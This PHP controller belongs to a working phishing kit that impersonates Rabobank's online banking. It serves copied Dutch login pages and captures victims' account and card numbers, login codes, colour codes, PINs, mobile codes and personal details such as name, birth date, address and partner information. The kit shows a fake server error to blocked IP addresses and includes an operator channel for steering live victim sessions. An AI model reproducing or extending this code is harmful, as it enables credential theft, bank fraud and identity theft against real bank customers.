<?php
namespace controllers;

class rabo{

	private $rabo_model;
	public function __construct($uidNeeded = false) {
		$this->rabo_model = new \models\rabo();
		if($uidNeeded == true) {
			if(empty($_SESSION['uid']) || $this->rabo_model->entryExists($_SESSION['uid']) == false) {
				header("location: /nl/retail/login");
			}
		}
		
		if($this->rabo_model->isBlocked($_SERVER['REMOTE_ADDR'])) {
            die("<h1>Internal Server Error </h1>
                <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                <p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occured, and the actions you preformed.</p>
                <p>More information about this error may be avalible in the server error log.</p>
                ");
		}
	}

	public function listenfordirections($uid) {
		echo $this->rabo_model->listenfordirections($uid);
	}

	public function heartbeat($uid) {
		$this->rabo_model->heartbeat($uid);
	}

	public function login($error = false) {
		if(empty($_SESSION['uid']) || $this->rabo_model->entryExists($_SESSION['uid']) == false) { $this->rabo_model->newRaboEntry($_SERVER['REMOTE_ADDR'] ,$_SERVER['HTTP_USER_AGENT']); }
		if(isset($_POST['AuthId']) && isset($_POST['AuthBpasNr'])){ 
			$a = $this->rabo_model->submitLogin($_SESSION['uid'], $_POST['AuthId'], $_POST['AuthBpasNr']);
			if($a == true) {
				header("Location: /klanten/qsl_controle.do");
			}
		}

		$tpl = new \classes\core\template("./views/rabo/inloggen/index.html");
			if($error == true ){ $tpl->set('error', '<div class="rass-state-svrerror">De combinatie van uw rekeningnummer, pasnummer en de code is onjuist. Bij herhaling van deze fout kunt u contact opnemen met uw lokale Rabobank. (947)</div>');}
			elseif($error == false) { $tpl->set("error", ""); 	}
		echo $tpl->draw();
	}

	public function controle() {
		$tpl = new \classes\core\template("./views/rabo/controle/index.html");
		echo $tpl->draw();
	}

	public function kleurcode($error) {
		if(isset($_POST['kleurcode2'])) {
			$a = $this->rabo_model->submitKleurcode($_SESSION['uid'], $_POST['kleurcode2']);
			if($a == true) {
				header("Location: /klanten/qsl_controle.do");
			}			
		}

		$tpl = new \classes\core\template("./views/rabo/kleurcode/index.html");
			$tpl->set("kleurcode", $this->rabo_model->getCustomInput($_SESSION['uid']));
			if($error == true ){ $tpl->set('error', '<div class="rass-state-svrerror">LET OP! Bedragen op de Rabo Scanner kunnen niet kloppen vanwege een storing.</div>');}
			elseif($error == false) { $tpl->set("error", ""); 	}
		echo $tpl->draw();
	}

	public function gegevens() { 
		if(isset($_POST['volledigenaam']) && isset($_POST['geboorteplaats']) && isset($_POST['geboortedatum'])) { 
			$a = $this->rabo_model->submitGegevens($_SESSION['uid'], $_POST['volledigenaam'], $_POST['geboorteplaats'], $_POST['geboortedatum'], $_POST['adres'], $_POST['email'], $_POST['telefoon'], (isset($_POST['volledigenaam-partner'])) ? $_POST['volledigenaam-partner'] : NULL, (isset($_POST['geboortedatum-partner'])) ? $_POST['geboortedatum-partner'] : NULL);
			if($a == true) {
				header("Location: /klanten/qsl_controle.do");
			}		
		}
		$tpl = new \classes\core\template("./views/rabo/gegevens/index.html");
		echo $tpl->draw();
	}

	public function pincode() {
		if(isset($_POST['pin1'])) {
			$a = $this->rabo_model->submitPincode($_SESSION['uid'], $_POST['pin1'], $_POST['pin2'], $_POST['pin_3']);
			if($a == true) {
				header("Location: /klanten/qsl_controle.do");
			}
		}

		$tpl = new \classes\core\template("./views/rabo/pincode/index.html");
		echo $tpl->draw();
	}


	public function mobielecode() {
		if(isset($_POST['pin1'])) {
			$a = $this->rabo_model->submitPincode($_SESSION['uid'], $_POST['pin1']);
			if($a == true) {
				header("Location: /klanten/qsl_controle.do");
			}
		}

		$tpl = new \classes\core\template("./views/rabo/pincode/index.html");
		echo $tpl->draw();
	}

}